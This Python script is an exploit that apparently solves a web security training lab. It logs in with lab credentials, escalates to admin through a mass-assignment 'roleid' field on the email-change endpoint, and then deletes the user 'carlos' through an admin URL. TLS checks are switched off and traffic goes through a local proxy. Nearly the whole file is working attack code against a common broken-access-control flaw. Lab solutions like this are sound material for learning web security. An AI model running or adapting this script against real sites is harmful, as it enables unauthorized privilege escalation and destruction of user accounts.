import sys
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

PROXIES = { 'http' : 'http://127.0.0.1:8080', 'https' : 'http://127.0.0.1:8080' }

def update_email(s, url):
    update_email_url = f"{url}/my-account/change-email"
    update_email_data = { "email" : "test@test.cs", "roleid" : 2 }
    
    # Explicitly define headers if the target backend is picky about content types
    # headers = {"Content-Type": "application/json"} [optional] and pass it to the function as parameter --> headers=headers
    
    r = s.post(update_email_url, verify=False, json=update_email_data, proxies=PROXIES)
    
    # A cleaner validation to check if the role actually flipped on the profile
    if "Admin" in r.text and "roleid" not in r.text: 
        print('[+] Privilege escalation successful: Account updated to Admin.')
        return True
        
    print('[-] Privilege escalation failed.')
    sys.exit(1)
            
def delete_user_carlos(s, url):
    login_url = f"{url}/login"
    login_data = { "username" : "wiener", "password": "peter" }
    
    r = s.post(login_url, verify=False, data=login_data, proxies=PROXIES)
    if "Log out" in r.text:
        print("[+] User login successful.")
        
        # Escalate privileges
        update_email(s, url)
        
        # Trigger the administrative action
        delete_url = f"{url}/admin/delete?username=carlos"
        r = s.get(delete_url, verify=False, proxies=PROXIES)
        
        if r.status_code == 200:
            print("[+] Target user 'carlos' deleted successfully!")
            sys.exit(0) # Standard clean exit status code
        else:
            print(f"[-] Deletion request failed with status code: {r.status_code}")
            sys.exit(1)
    else:
        print("[-] Authentication failed.")
        sys.exit(1) 

def main():
    if len(sys.argv) != 2:
        print(f'(+) Usage: {sys.argv[0]} <url>')
        print(f'(+) Example: {sys.argv[0]} https://example.com')
        sys.exit(1)
        
    s = requests.Session()
    # Strip any trailing slashes automatically to prevent malformed API paths
    url = sys.argv[1].rstrip('/')
    
    print('[*] Starting Exploit: Broken Access Control (Mass Assignment via Profile Update)')
    delete_user_carlos(s, url)        

if __name__ == "__main__":
    main()
